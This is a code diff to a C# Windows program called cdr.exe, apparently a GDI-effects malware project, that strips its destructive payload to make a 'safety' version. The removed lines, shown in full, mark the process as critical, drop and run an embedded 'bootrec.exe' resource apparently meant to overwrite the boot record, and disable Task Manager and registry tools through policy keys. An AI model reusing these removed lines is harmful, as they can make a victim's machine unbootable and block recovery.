@@ -640,8 +640,6 @@ namespace cdr
                 if (codcod >= 360) { codcod = 0; }
             }
         }
-        [DllImport("ntdll.dll", SetLastError = true)]
-        public static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
         [STAThread]
         static void Main()
         {
@@ -658,21 +656,10 @@ namespace cdr
 
         private static void RunWorkflow()
         {
-            if (MessageBox.Show("Run Malware?", "cdr.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
+            if (MessageBox.Show("Run GDIOnly?", "cdr.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
             {
                 if (MessageBox.Show("Are you sure?", "cdr.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
                 {
-                    Process.EnterDebugMode();
-                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
-                    string path = Path.Combine(Path.GetTempPath(), "bootrec.exe");
-                    File.WriteAllBytes(path, cdr.Properties.Resources.CdrMbr);
-                    Process.Start(path);
-
-                    RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-                    distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
-                    RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-                    disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
-
                     Drawer d1 = new Drawer1();
                     Drawer d2 = new Drawer2();
                     Drawer d3 = new Drawer3();
@@ -685,16 +672,16 @@ namespace cdr
                     Drawer d10 = new Drawer10();
                     Drawer cur = new cur();
 
-                    SoundPlayer js1 = new SoundPlayer(cdr.Properties.Resources.track__1_);
-                    SoundPlayer js2 = new SoundPlayer(cdr.Properties.Resources.track__2_);
-                    SoundPlayer js3 = new SoundPlayer(cdr.Properties.Resources.track__3_);
-                    SoundPlayer js4 = new SoundPlayer(cdr.Properties.Resources.track__4_);
-                    SoundPlayer js5 = new SoundPlayer(cdr.Properties.Resources.track__5_);
-                    SoundPlayer js6 = new SoundPlayer(cdr.Properties.Resources.track__6_);
-                    SoundPlayer js7 = new SoundPlayer(cdr.Properties.Resources.track__7_);
-                    SoundPlayer js8 = new SoundPlayer(cdr.Properties.Resources.track__8_);
-                    SoundPlayer js9 = new SoundPlayer(cdr.Properties.Resources.track__9_);
-                    SoundPlayer js10 = new SoundPlayer(cdr.Properties.Resources.track__10_);
+                    SoundPlayer js1 = new SoundPlayer(cdr_safety.Properties.Resources.track__1_);
+                    SoundPlayer js2 = new SoundPlayer(cdr_safety.Properties.Resources.track__2_);
+                    SoundPlayer js3 = new SoundPlayer(cdr_safety.Properties.Resources.track__3_);
+                    SoundPlayer js4 = new SoundPlayer(cdr_safety.Properties.Resources.track__4_);
+                    SoundPlayer js5 = new SoundPlayer(cdr_safety.Properties.Resources.track__5_);
+                    SoundPlayer js6 = new SoundPlayer(cdr_safety.Properties.Resources.track__6_);
+                    SoundPlayer js7 = new SoundPlayer(cdr_safety.Properties.Resources.track__7_);
+                    SoundPlayer js8 = new SoundPlayer(cdr_safety.Properties.Resources.track__8_);
+                    SoundPlayer js9 = new SoundPlayer(cdr_safety.Properties.Resources.track__9_);
+                    SoundPlayer js10 = new SoundPlayer(cdr_safety.Properties.Resources.track__10_);
 
                     Thread.Sleep(5000);
 
